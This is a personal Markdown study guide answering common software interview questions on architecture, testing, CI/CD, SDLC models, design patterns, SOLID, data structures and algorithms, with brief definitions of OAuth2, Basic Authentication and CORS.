# General enterprise questions

## Software engineering

### Architectures

#### What is n-tier (or multi-tier) architecture?

https://learn.microsoft.com/en-us/azure/architecture/guide/architecture-styles/n-tier

It is an architecture style that divides an application into logical layers and physical tiers. Each layer has a specific responsibility. A higher layer can use services in a lower layer, but not the other way around.

Tiers can be physically separated, running on separate machines. Layers can run on their own tiers, but that's not required. Several layers might be hosted on the same tier. Physically separating the tiers improves scalability and resiliency, but also adds latency from the additional network communication.

A traditional three-tier application has a presentation tier, an optional middle tier and a database tier. More complex applications can have more tiers.

An N-tier application can have a closed layer architecture (a layer can only call the next layer immediately donw) or an open layer architecture (a layer can call any of the layers below it).

N-tier architectures are typically implemented as infrastructure-as-service (IaaS) applications with each tier running on a separate set of VMs. Examples: Simple web apps, migrating an on-premises app to cloud with minimal refactoring, unified dev of on-premises and cloud apps.

#### What are microservices? Advantages and disadvantages?

https://microservices.io/

Microservices, or microservice architecture is an architectural style that structures an app as a collection of services that are:
- independently deployable,
- loosely coupled,
- organized around business capabilities,
- owned by a small team.

It enables organizations to deliver large, complex applications rapidly, frequently, reliably and sustainably = competitively.

https://www.javatpoint.com/advantges-and-disadvantages-of-microservices

Advantages:
- self-contained, independent deployment modules,
- cost of scaling is comparatively less than the monolithic architecture,
- microservices are independently manageable services; more and more services can be enabled as the need rises; it minimizes impact on existing service,
- it's possible to change or upgrade each service individually rather than upgrading in the entire app,
- allows to develop an app that is organic in nature (adding more functions laterally),
- single responsibility principle,
- can be deployed on multiple servers to enhance performance,
- less dependency and easy to test,
- dynamic scaling,
- faster release cycle.

Disadvantages:
- complexity of a distributed system,
- higher chance of failure between different services,
- difficult to manage a large number of services,
- network latency, load balancing need to be solved,
- complex testing over a distributed environment.

#### What is Separation of Concerns?

(wiki)

It is a design principle for separating a computer program into distinct sections. Each section addresses a separate concern, a set of information that affects the code of a computer program. A program that implements SoC well is called a modular program. Modularity is achieved by encapsulating information inside a section of code that has a well-defined interface. Encapsulation is a means of information hiding. Layered designs in information systems are another embodiment of separation of concerns (presentation layer, business logic layer, data access layer, persistance layer).

#### What is a layered design and why is it important in enterprise applications?

See n-tier architecture.

https://subscription.packtpub.com/book/programming/9781785888823/1/ch01lvl1sec11/tiers-and-layers-in-an-enterprise-application

An enterprise application usually has huge code. Developing and then maintaining this code is a very complex task. So the code is divided into small, maintainable modules, which can easily developed separately and later on combined to give a final product. All modules which provide similar kind of functionality will be grouped together to form a layer. These layers are the logical separation of modules. But sometimes for better performance one layer can be also spread over the network.

#### What is Dependency Injection?

https://en.wikipedia.org/wiki/Dependency_injection

In software engineering, dependency injection is a design pattern in which an object or function receives other objects or functions that it depends on. It is a form of inversion of control, dependency injection aims to separate the concerns of constructing objects and using them, leading to loosely coupled programs.

The pattern ensures that an object or function which wants to use a given service should not have to know how to construct those services. Instead, the receiving 'client' (object or function) is provided with its dependencies by external code (an 'injector'), which it is not aware of.

Dependency injection helps by making implicit dependencies explicit and helps solve the following problems:

- How can a class be independent from the creation of the objects it depends on?
- How can an application, and the objects it uses support different configurations?
- How can the behavior of a piece of code be changed without editing it directly?

#### What is the DAO pattern? When and how to implement?

https://www.digitalocean.com/community/tutorials/dao-design-pattern

DAO stands for Data Access Object. DAO design pattern is used to separate the data persistence logic in a separate layer. This way, the service remains completely in dark about how the low-level operations to access the database is done. This is known as the principle of Separation of Logic.

The components: Model, Interface, Interface implementation of the persistence logic

![DAO logic diagram](https://journaldev.nyc3.digitaloceanspaces.com/2017/11/DAO-Pattern.png)

Book model is transferred from one layer to the other (db to view). The BookDao interface provides a felxible design and API to implement. The BookDaoImpl class implements the BookDao interface.

#### What is SOA? When to use?

https://aws.amazon.com/what-is/service-oriented-architecture/

SOA stands for service-oriented architecture, it is a method of software development that uses software components called services to create business applications. Each service provides a business capability, and services can also communicate with each other across platforms and languages. Developers use SOA to reuse services in different systems or combine several independent services to perform complex tasks.

Benefits:
- faster time to market,
- efficient maintenance,
- greate adaptability

Basic principles:
- interoperability,
- loose coupling (as little dependency as possible on external resources, statelessness),
- abstraction,
- granularity (ideally one function per service).

When to use? It is usually no longer in use, except microservices when the scope and complexity of a project requires it. E.g. many different independent modules, etc.

### Testing

#### What are unit test, integration test, system test, regression test, acceptance test? What is the major difference between these?

Unit tests are used to test individual units of code, such as functions or methods, in isolation from the rest of the system. These tests are typically written by developers and are used to ensure that the individual units of code are working correctly and are free of bugs. Unit tests should be small, fast and atomic, they should cover only the unit of code they are assigned to test.

Integration tests, on the other hand, test how different units of code interact with each other. These tests are used to ensure that the different parts of the system are working together correctly and that there are no bugs or issues when the different units of code are integrated. Integration tests are more complex and time-consuming than unit tests, they should cover multiple units and they test the whole system behavior.

The main difference between unit tests and integration tests is the scope of what is being tested. Unit tests focus on small, isolated units of code, whereas integration tests focus on how different units of code interact with each other. Unit tests are usually faster and simpler to write, but integration tests are necessary to ensure that the whole system is working correctly.

Unit tests are important for early detecting of errors or bugs and to make code more reliable, integration tests are important for early detecting of errors or bugs between the different components or systems of the whole software.

<br>

#### What is code coverage? Why is it used? How you can measure?

Code coverage is a mesaure of how much of the code is tested. The higher the number, the more percentage of the code is tested, the lower the chance of undetected bugs being present in the code.

#### What does mocking mean? How would you do it 'manually' (i. e. without using any fancy framework)?

Mocking means creating a fake version of an external or internal service that can stand in for the real one, helping your tests run more quickly and more reliably. When your implementation interacts with an object’s properties, rather than its function or behavior, a mock can be used.

Mocking is a process used in unit testing when the unit being tested has external dependencies.
The purpose of mocking is to isolate and focus on the code being tested and not on the behavior
or state of external dependencies.

Manually mocking a part of code could be made by creating a fake class and using it as the dependency for our code. The required methods wouldn't include any logic, just returning some fake data.

#### What is a test case? What is an assertion? Give examples!

https://www.techtarget.com/searchsoftwarequality/definition/test-case

A test case is a set of actions performed on a system to determine if it satisfies software requirements and functions correctly.
Test cases define how to test a system. They expose any errors or defects.

A test case consists of a test name, an objective (of what the test case wishes to verify), test setup, test steps and expected results.

Examples of Test cases:

```cs
    [Test]
    public void ReturnsCorrectNumberOfProducts()
    {
        uint count = 10;
        var generator = new RandomProductGenerator(count, MinimumPrice, MaximumPrice);

        Assert.That(generator.Products.Count(), Is.EqualTo(count));
    }

    [Test]
    public void ProductNameContainsColor()
    {
        uint count = 10;
        var generator = new RandomProductGenerator(count, MinimumPrice, MaximumPrice);

        foreach (var product in generator.Products)
        {
            Assert.That(product.Name, Does.Contain(product.Color.ToString()));
        }
    }
```

#### What is TDD? What are the benefits?

https://en.wikipedia.org/wiki/Test-driven_development

TDD stands for Test Driver Development. It is a software development process relying on software requirements being converted to test cases before software is fully developed, and tracking all software development by repeatedly testing the software against all test cases. This is as opposed to software being developed first and test cases created later.

Test-driven development cycle:
1) Add a test
2) Run all tests. The new test should fail for expected reasons

    This shows that new code is actually needed for the desired feature. It validates that the test harness is working correctly. It rules out the possibility that the new test is flawed and will always pass.

3) Write the simplest code that passes the new test

    Inelegant or hard code is acceptable, as long as it passes the test. The code will be honed anyway in Step 5. No code should be added beyond the tested functionality.


4) All tests should now pass

    If any fail, the new code must be revised until they pass. This ensures the new code meets the test requirements and does not break existing features.

5) Refactor as needed, using tests after each refactor to ensure that functionality is preserved

Benefits:

https://northcoders.com/company/blog/the-benefits-of-test-driven-development-tdd

- Very high test-coverage
- Improved code quality
- Prevents bugs early on in the development process
- Easy to add functionality to the code
- Code can be understood easily

#### What are the unit testing best practices? (Eg. how many assertion should a test case contain?)

https://www.spiceworks.com/tech/devops/articles/what-is-unit-testing/
https://canro91.github.io/2021/07/19/WriteBetterAssertions/

- appropriate test names
- readable, simple tests (avoid logic in the test)
- separate arrange / act / assert by line breaks
- have a single act and assert part in each test
- using the right assertion method
- deterministic tests
- address a single use case (test a single block of code)
- aim for maximum test coverage
- design them to be as fast as possible
- minimize test dependencies (write isolated tests)
- adops test automation

#### What is arrange/act/assert pattern?

The AAA pattern is a testing pattern that suggests to divide a test method into three sections.

Arrange, where the required code is to setup the test. In this part are objects and mocks set up.
Act, where a method tested is invoked.
Assert, where we check an expectation agains the result.

### DevOps

#### What is continuous integration? Why is CI important?

https://www.atlassian.com/continuous-delivery/principles/continuous-integration-vs-delivery-vs-deployment

Developers practicing continuous integration merge their changes back to the main branch as often as possible. The developer's changes are validated by creating a build and running automated tests against the build. By doing so, you avoid integration challenges that can happen when waiting for release day to merge changes into the release branch.

Continuous integration puts a great emphasis on testing automation to check that the application is not broken whenever new commits are integrated into the main branch.

From https://continuousdelivery.com/foundations/continuous-integration/

Determine if teams are really practicing CI:
1) are all the engineers pushing their code into trunk / master (not feature branches) on a daily basis?
2) does every commit trigger a run of the unit tests?
3) When the build is broken, is it typically fixed within 10 minutes?

If you can answer yes to all three questions, the team is practicing continuous integration.

"If it hurts, do it more!"
Due to continuous integration, and frequent code merges, the merges and the conflicts are smaller.

#### Why are tests important in the CI workflow?

Because everyone merges to master at least once a day, testing is crucial to avoid production bugs.
These tests need to run on every commit / merge automatically. These tests are integration tests, UI tests, acceptance tests.

#### Name some software that help the CI workflow!

https://journey.study/v2/learn/courses/252/modules/18552/units/9/materials/5847

- Jenkins (open source): most popular among Java developers.
- Bitbucket Pipelines
- Travis CI (open source): popular among open source projects.
- Lots of hosted CI services: Gitlab CI, AWS CI, Microsoft VSTS CI, Atlassian, 
- ... and many-many more.

#### What is Continuous Delivery?

https://www.atlassian.com/continuous-delivery/principles/continuous-integration-vs-delivery-vs-deployment

Continuous delivery is an extension of continuous integration since it automatically deploys all code changes to a testing and/or production environment after the build stage. 

This means that on top of automated testing, you have an automated release process and you can deploy your application any time by clicking a button.

In theory, with continuous delivery, you can decide to release daily, weekly, fortnightly, or whatever suits your business requirements. However, if you truly want to get the benefits of continuous delivery, you should deploy to production as early as possible to make sure that you release small batches that are easy to troubleshoot in case of a problem.

#### What is Continuous Deployment?

https://www.atlassian.com/continuous-delivery/principles/continuous-integration-vs-delivery-vs-deployment

Continuous deployment goes one step further than continuous delivery. With this practice, every change that passes all stages of your production pipeline is released to your customers. There's no human intervention, and only a failed test will prevent a new change to be deployed to production.

Continuous deployment is an excellent way to accelerate the feedback loop with your customers and take pressure off the team as there isn't a "release day" anymore. Developers can focus on building software, and they see their work go live minutes after they've finished working on it.

#### What is DevOps?

Wiki:

DevOps is a methodology in the software development and IT industry. Used as a set of practices and tools, DevOps integrates and automates the work of software development (Dev) and IT operations (Ops) as a means for improving and shortening the systems development life cycle. DevOps is complementary to agile software development; several DevOps aspects came from the agile way of working.

https://aws.amazon.com/devops/what-is-devops/

DevOps is the combination of cultural philosophies, practices, and tools that increases an organization’s ability to deliver applications and services at high velocity: evolving and improving products at a faster pace than organizations using traditional software development and infrastructure management processes. This speed enables organizations to better serve their customers and compete more effectively in the market.

DevOps practices are: Continuous Integration, Continuous Delivery, Microservices, Infrastructure as Code, Monitoring and Logging, Communication and Collaboration.

### Software Methodologies

#### What kind of software-lifecycle models do you know?

https://www.roberthalf.com/blog/salaries-and-skills/6-basic-sdlc-methodologies-which-one-is-best

Software development life-cycles (SDLC) are a development systems that aim to achieve goals during and after the development of a software. Common goals include detection of bugs and errors.

The common stages of SDLC are planning, analysis, design, building, testing, deployment and maintenance. There are multiple models that go through these steps with different methods and with different points of view in focus.

Some methodologies:

- Agile

In the Agile model, fast failure is a good thing. This approach produces ongoing release cycles, each featuring small, incremental changes from the previous release. At each iteration, the product is tested. The Agile model helps teams identify and address small issues on projects before they evolve into more significant problems, and it engages business stakeholders to give feedback throughout the development process.

As part of their embrace of this methodology, many teams also apply an Agile framework known as Scrum to help structure more complex development projects. Scrum teams work in sprints, which usually last two to four weeks, to complete assigned tasks. Daily Scrum meetings help the whole team monitor progress throughout the project. And the ScrumMaster is tasked with keeping the team focused on its goal.

- Lean

The Lean process is about working only on what must be worked on at the time, so there’s no room for multitasking. Project teams are also focused on finding opportunities to cut waste at every turn throughout the SDLC process, from dropping unnecessary meetings to reducing documentation.

The Agile model is actually a Lean method for the SDLC, but with some notable differences. One is how each prioritizes customer satisfaction: Agile makes it the top priority from the outset, creating a flexible process where project teams can respond quickly to stakeholder feedback throughout the SDLC. Lean, meanwhile, emphasizes the elimination of waste as a way to create more overall value for customers — which, in turn, helps to enhance satisfaction.

- Waterfall

Waterfall is widely considered the oldest of the structured SDLC methodologies. It’s also a very straightforward approach: finish one phase, then move on to the next. No going back. Each stage relies on information from the previous stage and has its own project plan. Drawback: rigidity, delays throw off entire plan.

- Iterative

The Iterative model is repetition incarnate. Instead of starting with fully known requirements, project teams implement a set of software requirements, then test, evaluate and pinpoint further requirements. A new version of the software is produced with each phase, or iteration. Rinse and repeat until the complete system is ready.

Advantages of the Iterative model over other common SDLC methodologies is that it produces a working version of the project early in the process and makes it less expensive to implement changes. One disadvantage: Repetitive processes can consume resources quickly.

One example of an Iterative model is the Rational Unified Process (RUP), developed by IBM’s Rational Software division. RUP is a process product, designed to enhance team productivity for a wide range of projects and organizations.

RUP divides the development process into four phases:

-Inception, when the idea for a project is set
-Elaboration, when the project is further defined and resources are evaluated
-Construction, when the project is developed and completed
-Transition, when the product is released

Each phase of the project involves business modeling, analysis and design, implementation, testing, and deployment.

- Spiral

One of the most flexible SDLC methodologies, Spiral takes a cue from the Iterative model and its repetition. The project passes through four phases (planning, risk analysis, engineering and evaluation) over and over in a figurative spiral until completed, allowing for multiple rounds of refinement.

The Spiral model is typically used for large projects. It enables development teams to build a highly customized product and incorporate user feedback early on. Another benefit of this SDLC model is risk management. Each iteration starts by looking ahead to potential risks and figuring out how best to avoid or mitigate them.

[label](https://www.google.com/url?sa%3Di%26url%3Dhttps%3A%2F%2Fwww.techtarget.com%2Fsearchsoftwarequality%2Fdefinition%2Fspiral-model%26psig%3DAOvVaw19bEtbN2ZdzJofijC8foVM%26ust%3D1685909166699000%26source%3Dimages%26cd%3Dvfe%26ved%3D0CBEQjRxqFwoTCKCdoJbzp_8CFQAAAAAdAAAAABAQ)

- DevOps

The DevOps methodology is a relative newcomer to the SDLC scene. It emerged from two trends: the application of Agile and Lean practices to operations work, and the general shift in business toward seeing the value of collaboration between development and operations staff at all stages of the SDLC process.

In a DevOps model, Developers and Operations teams work together closely — and sometimes as one team — to accelerate innovation and the deployment of higher-quality and more reliable software products and functionalities. Updates to products are small but frequent. Discipline, continuous feedback and process improvement, and automation of manual development processes are all hallmarks of the DevOps model.


#### What is a UML diagram? What kind of diagram types do you know?

https://tallyfy.com/uml-diagram/
A UML diagram is a diagram based on the UML (Unified Modeling Language) with the purpose of visually representing a system along with its main actors, roles, actions, artifacts or classes, in order to better understand, alter, maintain, or document information about the system. UML is a modern approach to modeling and documenting software. In fact, it’s one of the most popular business process modeling techniques. It is based on diagrammatic representations of software components. As the old proverb says: “a picture is worth a thousand words”. By using visual representations, we are able to better understand possible flaws or errors in software or business processes.

UML was created as a result of the chaos revolving around software development and documentation. In the 1990s, there were several different ways to represent and document software systems. The need arose for a more unified way to visually represent those systems and as a result, in 1994-1996, the UML was developed by three software engineers working at Rational Software. It was later adopted as the standard in 1997 and has remained the standard ever since, receiving only a few updates.

https://creately.com/blog/diagrams/uml-diagram-types-examples/

There are:
- Structure diagrams (class, component, deployment, object, package, profile, composite structure diagrams)
- Behavioral diagrams (use case, activity, state machine, sequence, communication, interaction overview, timing diagrams).

See the link above for examples.


#### What is a UML class diagram? What are the typical elements?

https://www.visual-paradigm.com/guide/uml-unified-modeling-language/uml-class-diagram-tutorial/

The UML Class diagram is a graphical notation used to construct and visualize object oriented systems. A class diagram in the Unified Modeling Language (UML) is a type of static structure diagram that describes the structure of a system by showing the system's:

- classes,
- their attributes,
- operations (methods),
- and the relationships among objects.

![UML Class notation](https://cdn-images.visual-paradigm.com/guide/uml/uml-class-diagram-tutorial/02-class-notation.png)


#### What kind of design patterns do you know? Bring at least 3 examples.

A software design pattern is a general, reusable solution to a commonly occurring problem within a given context in software design. It is not a finished design that can be transformed directly into source or machine code. Rather, it is a description or template for how to solve a problem that can be used in many different situations. Design patterns are formalized best practices that the programmer can use to solve common problems when designing an application or system.

Examples:
- Singleton: used to limit creation of a class to only one object. When one object is needed to coordinate actions across the system. E.g. caches, thread pools, registries. -> private constructor
- Factory method: produces object without specifying the exact class to be created. To achieve this, objects are created by classing a factory method instead of calling a constructor.
- Observer: one-to-many dependency between objects so that when one object changes state, all its dependents are notified -> typically by calling one of their methods. Observer+subject. Subject generates, observer receives updates.
- Builder: Used to build objects. These can be complex, made up of several sub-objects or require an elaborate construction process. A builder builds a composite / aggregate object. Builder creates the object step by step whereas the factory pattern returns the object in one go.
- Adapter: allows incompatible classes to work together by converting the interface of one class into another. E.g. exml output vs JSON input -> adapter between.
- State: instead of a property and switch-case for different states, the object should have different class for each state. The different behaviours should reflect in the methods of these classes. And a state is a class / interface.
- Strategy: allows grouping of related algorithms under an abstraction, which allows swithing out one algorithm or policy for another without modifying the client. Instead of directly implementing a single algorithm, the code receives runtime instructions specifying which of the group of algorithms to run.


#### What is the purpose of the Iterator Pattern?

https://refactoring.guru/design-patterns/iterator
Iterator is a behavioral design pattern that lets you traverse elements of a collection without exposing its underlying representation (list, stack, tree, etc.).
Collections are one of the most used data types in programming. Nonetheless, a collection is just a container for a group of objects.

Most collections store their elements in simple lists. However, some of them are based on stacks, trees, graphs and other complex data structures.

But no matter how a collection is structured, it must provide some way of accessing its elements so that other code can use these elements. There should be a way to go through each element of the collection without accessing the same elements over and over.

The main idea of the Iterator pattern is to extract the traversal behavior of a collection into a separate object called an iterator.

In addition to implementing the algorithm itself, an iterator object encapsulates all of the traversal details, such as the current position and how many elements are left till the end. Because of this, several iterators can go through the same collection at the same time, independently of each other.

Usually, iterators provide one primary method for fetching elements of the collection. The client can keep running this method until it doesn’t return anything, which means that the iterator has traversed all of the elements.

All iterators must implement the same interface. This makes the client code compatible with any collection type or any traversal algorithm as long as there’s a proper iterator. If you need a special way to traverse a collection, you just create a new iterator class, without having to change the collection or the client.

![Iterator basic idea](https://refactoring.guru/images/patterns/diagrams/iterator/structure.png?id%3D35ea851f8f6bbe51d79eb91e6e6519d0)

 - Use the Iterator pattern when your collection has a complex data structure under the hood, but you want to hide its complexity from clients (either for convenience or security reasons).
 The iterator encapsulates the details of working with a complex data structure and provides the client with several simple methods of accessing the collection elements.
 -  Use the pattern to reduce duplication of the traversal code across your app.
-  Use the Iterator when you want your code to be able to traverse different data structures or when types of these structures are unknown beforehand.

#### What do you know about the SOLID principles?

SOLID stands for:
- Single Responsibility Principle,
- Open/Closed principle,
- Liskov Substitution Principle,
- Interface Segregation Principle,
- Dependency Inversion Principle.

**Single Responsibility Principle**

According to the SRP every class, module, or function in a program should only have one responsibility/purpose.
As a commonly used definition, "every class should have only one reason to change".
<br>

**Open/Closed Principle**

The open-closed principle states that software entities should be open for extension, but closed for modification. 
This implies that such entities – classes, functions, and so on – should be created in a way that their
core functionalities can be extended to other entities without altering the initial entity's source code.
<br>

**Liskov Substitution Principle**

The Liskov substitution principle implies that when an instance of a class is passed/extended to another class,
the inheriting class should have a use case for all the properties and behavior of the inherited class. <br>

When a class is extended, if some of the properties of the initial class are not useful for the new class,
the Liskov substitution principle is violated. This means that inheritance should not happen here. <br>

Easier explained: Replacing the parent class with its child class in the code
should be possible without breaking the code.
<br>

**Interface Segregation Principle**

The interface segregation principle states that the interface of a program should be split
in a way that the user/client would only be able to access the necessary methods related to their needs.
<br>

**Dependency Inversion Principle**

High-level modules should not import anything from low-level modules.  Both should depend on abstractions
(e.g., interfaces). Abstractions should not depend on details (implementations). Details (concrete implementations)
should depend on abstractions.
<br>

#### How would you separate data storage code and business logic code (which uses stored data) in an application?

The two can be coded in two different classes and the business logic can have the data storage (interaction) class injected as dependency.
That way only the public methods of the data storage class are exposed to the business logic code, but not the data access logic itself.


## Computer science

### Data Structures

https://jntukucev.ac.in/wp-content/uploads/2020/03/ADS-lecture1.pdf
A data structure is a specialized format for organizing, processing, retrieving and storing data. While there are several basic and advanced structure types, any data structure is designed to arrange data to suit a specific purpose so that it can be accessed and worked with in appropriate ways. In computer programming, a data structure may be selected or designed to store data for the purpose of working on it with various algorithms. Each data structure contains information about the data values, relationships between the data and functions that can be applied to the data. The data structure is basically a technique of organizing and storing of different types of data items in computer memory. It is considered as not only the storing of data elements but also the maintaining of the logical relationship existing between individual data elements. The Data structure can also be defined as a mathematical or logical model, which relates to a particular organization of different data elements.

#### What is the difference between Stack and Queue data structure?

https://www.geeksforgeeks.org/difference-between-stack-and-queue-data-structures/

Both of them are **linear data structures**. Both are implemented using an array or linked list data structure.

In a **stack** the elements can be inserted and deleted only from one side of the list, called the top. It follows Last In, First Out principle, LIFO short. Insertion is called **push**, deletion from the stack is called **pop** operation. In a stack there is only one pointer, for the top.<br><br>
![Stack data structure](https://media.geeksforgeeks.org/wp-content/uploads/geek-stack-1.png)

Stacks are often used for tasks that require backtracking, such as parsing expressions or implementing undo functionality.
Stacks are often used for recursive algorithms or for maintaining a history of function calls.	
Stack does not have any types.	

In a **queue** the elements can be inserted from one side of the list, called the rear, and they can only be delete from the other side, called front. A queue follows First In, First Out principle, FIFO short. Insertion is called **enqueue**, deletion from the stack is called **dequeue** operation. In queue there are two pointers, front pointer and rear pointer.<br><br>
![Queue data structure](https://media.geeksforgeeks.org/wp-content/uploads/geek-queue-1.png)

Queues are often used for tasks that involve processing elements in a specific order, such as handling requests or scheduling tasks.
Queues are often used in multithreaded applications, where tasks are added to a queue and executed by a pool of worker threads.
Queue is of three types – 1. Circular Queue 2. Priority queue 3. double-ended queue.


#### What is a graph? What are simple graphs? What are directed graphs? What are weighted graphs?

https://www.geeksforgeeks.org/graph-data-structure-and-algorithms/

A Graph is a **non-linear data structur**e consisting of vertices and edges (csúcsok és élek). The vertices are sometimes also referred to as nodes (csomópont) and the edges are lines or arcs that connect any two nodes in the graph. More formally a Graph is composed of a set of vertices( V ) and a set of edges( E ). The graph is denoted by G(E, V).<br>

![A graph](https://media.geeksforgeeks.org/wp-content/uploads/20200630111809/graph18.jpg)

https://www.youtube.com/watch?v=2TxdysMT-jw
A simple graph is a graph that does not have multiple edges (parallel edges) and self-loops. The edges are undirected, have the same weight and it is finite.
Vertices can be disconnected too.

Real networks are often more complicated.

TODO:
Directed graphs, weighted graps


#### What are trees? What are binary trees? What are binary search trees?

https://www.geeksforgeeks.org/introduction-to-tree-data-structure-and-algorithm-tutorials/

A tree data structure is a **non-linear, hierarchical structure** that is used to represent and organize data in a way that is *easy to navigate and search*. It is a collection of nodes that are connected by edges and has a hierarchical relationship between the nodes. 

The topmost node of the tree is called the root, and the nodes below it are called the child nodes. Each node can have multiple child nodes, and these child nodes can also have their own child nodes, forming a recursive structure.

This data structure is a specialized method to organize and store data in the computer to be used more effectively. It consists of a central node, structural nodes, and sub-nodes, which are connected via edges. We can also say that tree data structure has roots, branches, and leaves connected with one another.<br>

![Tree data structure](https://media.geeksforgeeks.org/wp-content/uploads/20221124153129/Treedatastructure.png)


https://www.geeksforgeeks.org/binary-tree-data-structure/

Binary Tree is defined as a tree data structure where each node has at most 2 children. Since each element in a binary tree can have only 2 children, we typically name them the left and right child.

![Binary tree](https://www.geeksforgeeks.org/wp-content/uploads/binary-tree-to-DLL.png)


https://www.geeksforgeeks.org/binary-search-tree-data-structure/
https://www.youtube.com/watch?v=pYT9F8_LFTM

Binary Search Tree (BST) is a binary tree in which **for each node**, value of all the nodes in left subtree (child) is less (or equal), and value of all the nodes in the right subree is greater than the node's value. It should be true to all the nodes.
Tree should be balanced: if the difference between the heights of left and right subtrees is not greater than 1.
Binary search tree gets unbalanced during insertion and deletion. Often during insertion and deletion, we restore balancing.


#### How can you store graphs in programs? What are the advantages/disadvantages per each?

https://www.geeksforgeeks.org/graph-and-its-representations/

The following two are the most commonly used representations of a graph.

- Adjacency Matrix
- Adjacency List

We follow the below pattern to use the **adjacency matrix** in code:

In the case of an undirected graph, we need to show that there is an edge from vertex i to vertex j and vice versa. In code, we assign adj[i][j] = 1  and adj[j][i] = 1.
In the case of a directed graph, if there is an edge from vertex i to vertex j then we just assign adj[i][j]=1.\

*Advantages of Adjacency Matrix:*

Representation is easier to implement and follow. 
Removing an edge takes O(1) time. 
Queries like whether there is an edge from vertex ‘u’ to vertex ‘v’ are efficient and can be done O(1).


*Disadvantages of Adjacency Matrix:*

Consumes more space O(V2). Even if the graph is sparse(contains less number of edges), it consumes the same space.
Adding a vertex takes O(V2) time. Computing all neighbors of a vertex takes O(V) time (Not efficient).


**Adjacency List:**
An array of linked lists is used. The size of the array is equal to the number of vertices. Let the array be an array[]. An entry array[i] represents the linked list of vertices adjacent to the ith vertex.

This representation can also be used to represent a weighted graph. The weights of edges can be represented as lists of pairs.

*Advantages of Adjacency List:*

Saves space. Space taken is O(|V|+|E|). In the worst case, there can be C(V, 2) number of edges in a graph thus consuming O(V2) space.
Adding a vertex is easier.
Computing all neighbors of a vertex takes optimal time.


*Disadvantages of Adjacency List:*

Queries like whether there is an edge from vertex u to vertex v are not efficient and can be done O(V).


#### What are graph traversal algorithms? What is BFS, how does it work? What is DFS, how does it work?

https://en.wikipedia.org/wiki/Graph_traversal
In computer science, graph traversal (also known as graph search) refers to the process of visiting (checking and/or updating) each vertex in a graph. Such traversals are classified by the order in which the vertices are visited.

A **breadth-first search (BFS)** is a technique for traversing a finite graph. BFS visits the sibling vertices before visiting the child vertices, and a queue is used in the search process. This algorithm is often used to find the shortest path from one vertex to another. https://www.youtube.com/watch?v=oDqjPvD54Ss

A **depth-first search (DFS)** is an algorithm for traversing a finite graph. DFS visits the child vertices before visiting the sibling vertices; that is, it traverses the depth of any particular path before exploring its breadth. A stack (often the program's call stack via recursion) is generally used when implementing the algorithm. https://www.youtube.com/watch?v=7fujbpJ0LB4

Both are O(V+E) (vertices + edges).

 Unlike trees, graphs may contain cycles, so we may come to the same node again. To avoid processing a node more than once, we divide the vertices into two categories:
- Visited,
- Not visited.

#### How does dictionary work?

https://www.scaler.com/topics/dictionary-in-data-structure/
- The dictionary in data structure is used to store the data in the form of key-value pair.
- The key is the attribute that helps us locate the data or value in the memory.
- The keys are always unique within a dictionary. The values of the dictionary in data structure may or may not be unique.
- The key attribute is immutable hence, we cannot have an array or list as keys, we can only have numbers, strings, etc, as the key.
- No duplicate keys are allowed in the dictionary data structure, so whenever a duplicate key is found, the last assigned value is treated as the final key-value pair.
- The key attribute is case sensitive hence "KEY" is not the same as "key".
- The value attribute can contain a single value or a collection of values stored in any sequential data type like lists, tuples, sets, etc.
- The dictionary in data structure internally uses hashing which makes the data retrieval faster.
- Dictionary in data structures are referred to by various names such as maps, symbol tables, etc.
- The dictionary data structure can store a large set of values for a specific key so it is widely used to store a heterogeneous set of data for a key.


#### Why is it important for keys in a hashmap to have an immutable type? (Consider string for example.)

Because if it is mutable, and a property is changed, then the calculated hashcode will change. If we try to search the map for this key, it may not find a value as its hashcode is changed and hashmap has calculated different index position for this key. (JAVA)

If the key changes, the original entry should be removed and a new entry with the new key should be added.
https://stackoverflow.com/questions/3917298/are-the-keys-in-a-dictionarytkey-tvalue-immutable


### Algorithms
#### What is QuickSort? Describe the main logic of this sorting algorithm.

keyword: pivot element

https://www.youtube.com/watch?v=Hoixgm4-P4M
Quicksort is an efficient, recursive, general-purpose sorting algorithm. A pivot element is selected, moved out of the way, the first element from the left that greater than it and the first element from the right smaller than it are chosen and swapped with each other. This selection and swapping occurs as long as the greater element is to the left of the smaller element. When the first greater than pivot element (starting from the left) is to the right of the first smaller than pivot element (starting from the right), then greater one is swapped with the pivot element. The pivot element is then in its correct place, and all elements to the left of it are smaller, and all elements to the right are greater. The method is then done for these two subsets (smaller than pivot, higher than pivot) and their subsets with newly chosen pivot elements.

## Software design

### Security

#### What is OAuth2?

https://en.wikipedia.org/wiki/OAuth#OAuth_2.0

OAuth: Open Authorization
It is an **open standard** for **access delegation**, commonly used as a way for internet users to grant websites or applications access to their information on other websites but without giving them the passwords. This mechanism is used by companies such as Amazon, Google, Facebook, Microsoft, and Twitter to permit the users to share information about their accounts with third-party applications or websites.

https://oauth.net/2/

OAuth 2.0 is the industry-standard protocol for authorization. OAuth 2.0 focuses on client developer simplicity while providing specific authorization flows for web applications, desktop applications, mobile phones, and living room devices. This specification and its extensions are being developed within the IETF OAuth Working Group.

The OAuth protocol provides a way for resource owners to provide a client (application) with secure delegated access to server resources. It specifies a process for resource owners to authorize third-party access to their server resources without providing credentials. Designed specifically to work with Hypertext Transfer Protocol (HTTP), OAuth essentially allows access tokens to be issued to third-party clients by an authorization server, with the approval of the resource owner. The third party then uses the access token to access the protected resources hosted by the resource server.

Explained with my own words:
Using OAuth2 allows us to register a user to our application without the user having to fill out a form, but instead using their registration at an existing OAuth2 provider (Google, Facebook, etc). We redirect the user to the provider's website (OAuth server), where they log in and grant our application permission to use some of their data. Based on this permission, the provider gives us the user's data which we can look up / register in our application.

#### What is Basic Authentication?

https://www.twilio.com/docs/glossary/what-is-basic-authentication

Basic Authentication is a method for an HTTP user agent (e.g., a web browser) to provide a username and password when making a request.

When employing Basic Authentication, users include an encoded string in the Authorization header of each request they make. The string is used by the request’s recipient to verify users’ identity and rights to access a resource.

The Authorization header follows this format:

```
Authorization: Basic <credentials>
```

The credentials can be username:password encoded e.g. in base64 format.


#### What is CORS, why it’s needed in browsers?

Cross-origin resource sharing (CORS) is a mechanism that allows restricted resources on a web page to be requested from another domain outside the domain (differet scheme (http vs https) AND/OR different hostname (www.xyz.com) AND/OR different port) from which the first resource was served.

https://reflectoring.io/complete-guide-to-cors/#:~:text=The%20CORS%20protocol%20is%20enforced,header%20values%20in%20the%20response.

“CORS” stands for Cross-Origin Resource Sharing. CORS is a protocol and security standard **for browsers** that helps to maintain the integrity of a website and secure it from unauthorized access.

It enables JavaScripts running in browsers to connect to APIs and other web resources like fonts, and stylesheets from multiple different providers.

